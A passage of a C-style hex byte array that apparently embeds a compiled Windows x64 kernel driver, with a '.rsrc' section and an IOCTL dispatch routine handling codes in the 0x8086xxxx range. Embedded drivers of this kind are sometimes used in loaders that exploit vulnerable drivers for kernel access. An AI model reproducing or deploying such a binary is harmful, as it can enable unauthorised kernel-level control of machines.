    0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0xE2, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x00, 0x00, 0x00,
    0xF8, 0x03, 0x00, 0x00, 0x00, 0x30, 0x5D, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0xD9, 0x48, 0x8D, 0x0D, 0xA0, 0x37, 0x00, 0x00,
    0xE8, 0x0B, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x84, 0x37, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24,
    0x20, 0xFF, 0x15, 0x69, 0x50, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xFF, 0x15, 0xE6, 0x50,
    0x00, 0x00, 0x48, 0x8B, 0x4B, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x18, 0xFF, 0x15, 0xE7, 0x50, 0x00,
    0x00, 0x48, 0x8D, 0x0D, 0x28, 0x37, 0x00, 0x00, 0xE8, 0xD3, 0x0E, 0x00, 0x00, 0x48, 0x83, 0xC4,
    0x30, 0x5B, 0xC3, 0x48, 0x8D, 0x0D, 0xC6, 0x36, 0x00, 0x00, 0xE8, 0xC1, 0x0E, 0x00, 0x00, 0x48,
    0x8D, 0x0D, 0x0A, 0x37, 0x00, 0x00, 0xE8, 0xB5, 0x0E, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x30, 0x5B,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D, 0x0D, 0xA3, 0x38, 0x00, 0x00, 0x48, 0x8B, 0xDA,
    0xE8, 0x8B, 0x0E, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x74, 0x60, 0x00, 0x00, 0xE8, 0x1F, 0x0E, 0x00,
    0x00, 0x45, 0x33, 0xDB, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0x4C, 0x89, 0x5B, 0x38, 0x44, 0x89, 0x5B,
    0x30, 0xFF, 0x15, 0x61, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x42, 0x38, 0x00, 0x00, 0xE8, 0x5D,
    0x0E, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D, 0x0D, 0xA3, 0x38, 0x00, 0x00, 0x48, 0x8B, 0xDA,
    0xE8, 0x2B, 0x0E, 0x00, 0x00, 0x45, 0x33, 0xDB, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0x4C, 0x89, 0x5B,
    0x38, 0x44, 0x89, 0x5B, 0x30, 0xFF, 0x15, 0x0D, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xFE, 0x5F,
    0x00, 0x00, 0xE8, 0xC9, 0x0D, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x42, 0x38, 0x00, 0x00, 0xE8, 0xFD,
    0x0D, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x82, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x40,
    0x48, 0x89, 0x7C, 0x24, 0x48, 0x48, 0x8B, 0x48, 0x20, 0x48, 0x8B, 0xFA, 0x8B, 0x50, 0x18, 0x48,
    0x85, 0xC9, 0x74, 0x57, 0x81, 0xFA, 0x07, 0x20, 0x86, 0x80, 0x74, 0x46, 0x81, 0xFA, 0x0B, 0x20,
    0x86, 0x80, 0x74, 0x35, 0x81, 0xFA, 0x0F, 0x20, 0x86, 0x80, 0x74, 0x24, 0x81, 0xFA, 0x13, 0x20,
    0x86, 0x80, 0x74, 0x13, 0x48, 0x8D, 0x0D, 0x65, 0x38, 0x00, 0x00, 0xBB, 0x0D, 0x00, 0x00, 0xC0,
    0xE8, 0x8B, 0x0D, 0x00, 0x00, 0xEB, 0x35, 0xE8, 0xF4, 0x2D, 0x00, 0x00, 0x8B, 0xD8, 0xEB, 0x2C,
    0xE8, 0x7B, 0x01, 0x00, 0x00, 0x8B, 0xD8, 0xEB, 0x23, 0xE8, 0xA2, 0x08, 0x00, 0x00, 0x8B, 0xD8,
    0xEB, 0x1A, 0xE8, 0xF9, 0x01, 0x00, 0x00, 0x8B, 0xD8, 0xEB, 0x11, 0x48, 0x8D, 0x0D, 0xFE, 0x37,
    0x00, 0x00, 0xE8, 0x59, 0x0D, 0x00, 0x00, 0xBB, 0x0D, 0x00, 0x00, 0xC0, 0x33, 0xD2, 0x48, 0x8B,
    0xCF, 0x48, 0xC7, 0x47, 0x38, 0x00, 0x00, 0x00, 0x00, 0x89, 0x5F, 0x30, 0xFF, 0x15, 0x36, 0x4E,
    0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x83,
    0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x8B, 0x05, 0x0A, 0x5F, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x53, 0x4C, 0x8B, 0x19, 0x45, 0x32, 0xD2, 0x45, 0x33, 0xC0, 0x4D, 0x8B, 0xC8, 0x49, 0x8B,
    0xC0, 0x48, 0x8D, 0x1D, 0x88, 0xEC, 0x5B, 0x00, 0x4C, 0x39, 0x1C, 0x18, 0x75, 0x0A, 0x80, 0xBC,
    0x18, 0x08, 0x01, 0x00, 0x00, 0x01, 0x74, 0x13, 0x48, 0x05, 0x10, 0x01, 0x00, 0x00, 0x49, 0xFF,
    0xC1, 0x48, 0x3D, 0x00, 0x10, 0x01, 0x00, 0x72, 0xDF, 0xEB, 0x22, 0x84, 0xD2, 0x75, 0x1B, 0x49,
    0x8B, 0xC1, 0x41, 0xB2, 0x01, 0x48, 0x69, 0xC0, 0x10, 0x01, 0x00, 0x00, 0x44, 0x88, 0x84, 0x18,
    0x08, 0x01, 0x00, 0x00, 0x4C, 0x89, 0x04, 0x18, 0xEB, 0x03, 0x45, 0x32, 0xD2, 0x49, 0x81, 0xF9,
    0x00, 0x01, 0x00, 0x00, 0x75, 0x24, 0x80, 0xFA, 0x01, 0x75, 0x45, 0x49, 0x8B, 0xC8, 0x66, 0x90,
    0x48, 0x83, 0x3C, 0x19, 0x00, 0x74, 0x18, 0x48, 0x81, 0xC1, 0x10, 0x01, 0x00, 0x00, 0x49, 0xFF,
    0xC0, 0x48, 0x81, 0xF9, 0x00, 0x10, 0x01, 0x00, 0x72, 0xE6, 0x41, 0x8A, 0xC2, 0x5B, 0xC3, 0x49,
    0x81, 0xF8, 0x00, 0x01, 0x00, 0x00, 0x73, 0xF2, 0x4D, 0x69, 0xC0, 0x10, 0x01, 0x00, 0x00, 0xB0,
    0x01, 0x4D, 0x89, 0x1C, 0x18, 0x41, 0xC6, 0x84, 0x18, 0x08, 0x01, 0x00, 0x00, 0x01, 0x5B, 0xC3,
    0x41, 0x0F, 0xB6, 0xC2, 0xB9, 0x01, 0x00, 0x00, 0x00, 0x84, 0xD2, 0x0F, 0x44, 0xC1, 0x5B, 0xC3,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0x11, 0x4C, 0x8D, 0x05, 0xC6, 0xEB, 0x5B, 0x00, 0x33, 0xC9, 0x66, 0x66, 0x66, 0x90,
    0x4A, 0x39, 0x14, 0x01, 0x75, 0x0B, 0x42, 0x80, 0xBC, 0x01, 0x08, 0x01, 0x00, 0x00, 0x01, 0x74,
    0x13, 0x48, 0x81, 0xC1, 0x10, 0x01, 0x00, 0x00, 0x48, 0x81, 0xF9, 0x00, 0x10, 0x01, 0x00, 0x72,
    0xDF, 0x32, 0xC0, 0xC3, 0xB0, 0x01, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x85, 0xC9, 0x74, 0x72, 0x48, 0x8B, 0x01, 0x48, 0xFF,
    0xC8, 0x74, 0x4E, 0x48, 0xFF, 0xC8, 0x74, 0x2C, 0x48, 0xFF, 0xC8, 0x74, 0x0B, 0xB8, 0x18, 0x20,
    0x6A, 0xC8, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x48, 0x8D, 0x59, 0x10, 0x48, 0x85, 0xDB, 0x74,
    0x44, 0x48, 0x8B, 0x4B, 0x08, 0xE8, 0x86, 0x2A, 0x00, 0x00, 0x89, 0x03, 0x33, 0xC0, 0x48, 0x83,
    0xC4, 0x20, 0x5B, 0xC3, 0x48, 0x8D, 0x59, 0x10, 0x48, 0x85, 0xDB, 0x74, 0x0C, 0x48, 0x8B, 0x4B,
    0x08, 0xE8, 0x7A, 0x2A, 0x00, 0x00, 0x88, 0x43, 0x04, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B,
    0xC3, 0x48, 0x8D, 0x59, 0x10, 0x48, 0x85, 0xDB, 0x74, 0x0B, 0x48, 0x8B, 0x4B, 0x08, 0xE8, 0x4D,
    0x2A, 0x00, 0x00, 0x89, 0x03, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xB8, 0x01, 0x00,
    0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x38, 0x48, 0x85, 0xC9, 0x48, 0x89, 0x5C, 0x24, 0x50, 0x48, 0x89, 0x7C, 0x24,
    0x58, 0x48, 0x8B, 0xF9, 0xBB, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x76, 0x05, 0x00, 0x00, 0x48,
    0x8B, 0x01, 0x48, 0xFF, 0xC8, 0x48, 0x83, 0xF8, 0x3A, 0x0F, 0x87, 0x61, 0x05, 0x00, 0x00, 0x48,
    0x8D, 0x0D, 0x0A, 0xEC, 0xFF, 0xFF, 0x8B, 0x84, 0x81, 0x68, 0x19, 0x00, 0x00, 0x48, 0x03, 0xC1,
    0xFF, 0xE0, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0x15, 0x08, 0x00, 0x00, 0x33, 0xDB, 0x88, 0x47, 0x10,
    0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38,
    0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0x06, 0x08, 0x00, 0x00, 0x33, 0xDB, 0x66, 0x89, 0x47, 0x10,
    0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38,
    0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xF6, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x89, 0x47, 0x10, 0x8B,
    0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3,
    0x0F, 0xB6, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xE3, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x88,
    0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83,
    0xC4, 0x38, 0xC3, 0x0F, 0xB7, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xD0, 0x07, 0x00, 0x00,
    0x33, 0xDB, 0x88, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24,
    0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x8B, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xCE, 0x07,
    0x00, 0x00, 0x33, 0xDB, 0x88, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B,
    0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xBF, 0x07, 0x00,
    0x00, 0x33, 0xDB, 0x88, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C,
    0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xC0, 0x07, 0x00, 0x00,
    0x33, 0xDB, 0x66, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C,
    0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xC0, 0x07, 0x00, 0x00,
    0x33, 0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24,
    0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x0F, 0xB6, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xBD,
    0x07, 0x00, 0x00, 0x33, 0xDB, 0x88, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48,
    0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x0F, 0xB7, 0x57, 0x20, 0x48, 0x8B, 0x4F,
    0x18, 0xE8, 0xBA, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x88, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C,
    0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x8B, 0x57, 0x20, 0x48,
    0x8B, 0x4F, 0x18, 0xE8, 0xB8, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x88, 0x47, 0x10, 0x8B, 0xC3, 0x48,
    0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B,
    0x57, 0x20, 0x4C, 0x8D, 0x47, 0x28, 0x48, 0x8D, 0x4F, 0x18, 0xE8, 0x21, 0x15, 0x00, 0x00, 0x33,
    0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50,
    0x48, 0x83, 0xC4, 0x38, 0xC3, 0x44, 0x8B, 0x47, 0x28, 0x48, 0x8B, 0x57, 0x20, 0x48, 0x8B, 0x4F,
    0x18, 0xE8, 0xFA, 0x0B, 0x00, 0x00, 0x33, 0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C,
    0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xE8, 0xCF, 0x07, 0x00,
    0x00, 0x33, 0xDB, 0x48, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B,
    0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xE8, 0x53, 0x0E, 0x00, 0x00, 0x33, 0xDB, 0x48,
    0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48,
    0x83, 0xC4, 0x38, 0xC3, 0x8B, 0x4F, 0x10, 0xE8, 0x34, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3,
    0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x8B,
    0x4F, 0x10, 0xE8, 0x89, 0x0D, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58,
    0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xBD,
    0x09, 0x00, 0x00, 0x33, 0xDB, 0x48, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58,
    0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x8B, 0x57, 0x1C, 0x8B, 0x4F, 0x18,
    0x33, 0xDB, 0x4C, 0x8D, 0x47, 0x20, 0x45, 0x33, 0xC9, 0x89, 0x5C, 0x24, 0x20, 0xE8, 0x2E, 0x12,
    0x00, 0x00, 0x48, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C,
    0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x10, 0x45, 0x33, 0xC0, 0x33, 0xD2,
    0xE8, 0x3B, 0x12, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B,
    0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0x48, 0x85, 0xC9, 0x74,
    0x1F, 0x4C, 0x8B, 0x47, 0x20, 0x8B, 0x57, 0x10, 0xE8, 0xA3, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x8B,
    0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3,
    0x48, 0x8D, 0x0D, 0x19, 0x34, 0x00, 0x00, 0xE8, 0x44, 0x08, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x8B,
    0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F,
    0x18, 0x48, 0x85, 0xC9, 0x74, 0x25, 0x48, 0x8B, 0x57, 0x10, 0x48, 0x85, 0xD2, 0x74, 0x1C, 0x4C,
    0x8B, 0x47, 0x20, 0xE8, 0x88, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24,
    0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8D, 0x0D, 0x8E, 0x33,
    0x00, 0x00, 0xE8, 0xF9, 0x07, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B,
    0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0x48, 0x85, 0xC9, 0x74,
    0x25, 0x48, 0x8B, 0x57, 0x10, 0x48, 0x85, 0xD2, 0x74, 0x1C, 0x4C, 0x8B, 0x47, 0x20, 0xE8, 0x3D,
    0x07, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24,
    0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8D, 0x0D, 0x03, 0x33, 0x00, 0x00, 0xE8, 0xAE, 0x07,
    0x00, 0x00, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83,
    0xC4, 0x38, 0xC3, 0x4C, 0x8B, 0x47, 0x20, 0x48, 0x8B, 0x57, 0x10, 0x48, 0x8B, 0x4F, 0x18, 0xE8,
    0xFC, 0x06, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C,
    0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0x10, 0x07, 0x00, 0x00,
    0x33, 0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24,
    0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x4F, 0x18, 0xE8, 0x11, 0x07, 0x00, 0x00, 0x33,
    0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50,
    0x48, 0x83, 0xC4, 0x38, 0xC3, 0x44, 0x8B, 0x47, 0x24, 0x8B, 0x57, 0x20, 0x48, 0x8B, 0x4F, 0x18,
    0xE8, 0x0B, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24,
    0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x83, 0xC7, 0x10, 0x74,
    0x3F, 0x0F, 0xB6, 0x0F, 0xE8, 0xD7, 0x07, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C,
    0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x83, 0xC7, 0x10,
    0x74, 0x1E, 0x48, 0x8D, 0x4F, 0x04, 0xE8, 0xE5, 0x06, 0x00, 0x00, 0x33, 0xDB, 0x89, 0x07, 0x8B,
    0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3,
    0x48, 0x8D, 0x0D, 0xD9, 0x31, 0x00, 0x00, 0xE8, 0xC4, 0x06, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x8B,
    0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x4C, 0x8B, 0x47,
    0x28, 0x8B, 0x57, 0x1C, 0x8B, 0x4F, 0x18, 0x33, 0xDB, 0x4C, 0x8D, 0x4F, 0x20, 0x89, 0x5C, 0x24,
    0x28, 0x48, 0x89, 0x5C, 0x24, 0x20, 0xE8, 0x85, 0x0C, 0x00, 0x00, 0x48, 0x89, 0x47, 0x10, 0x8B,
    0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3,
    0x48, 0x8B, 0x57, 0x18, 0x48, 0x8B, 0x4F, 0x10, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0xE8, 0xAD,
    0x0E, 0x00, 0x00, 0x33, 0xDB, 0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24,
    0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x4C, 0x8B, 0x4F, 0x30, 0x48, 0x8B, 0x57, 0x20, 0x4C, 0x8D,
    0x47, 0x28, 0x48, 0x8D, 0x4F, 0x18, 0xE8, 0xD5, 0x10, 0x00, 0x00, 0x33, 0xDB, 0x89, 0x47, 0x10,
    0x8B, 0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38,
    0xC3, 0x4C, 0x8B, 0x4F, 0x30, 0x44, 0x8B, 0x47, 0x28, 0x48, 0x8B, 0x57, 0x20, 0x48, 0x8B, 0x4F,
    0x18, 0xE8, 0x0A, 0x09, 0x00, 0x00, 0x33, 0xDB, 0x89, 0x47, 0x10, 0x8B, 0xC3, 0x48, 0x8B, 0x7C,
    0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x48, 0x8B, 0x57, 0x20,
    0x48, 0x8B, 0x4F, 0x18, 0xE8, 0xA7, 0x04, 0x00, 0x00, 0x33, 0xDB, 0x48, 0x89, 0x47, 0x10, 0x8B,
    0xC3, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3,
    0xBB, 0x18, 0x20, 0x6A, 0xC8, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24,
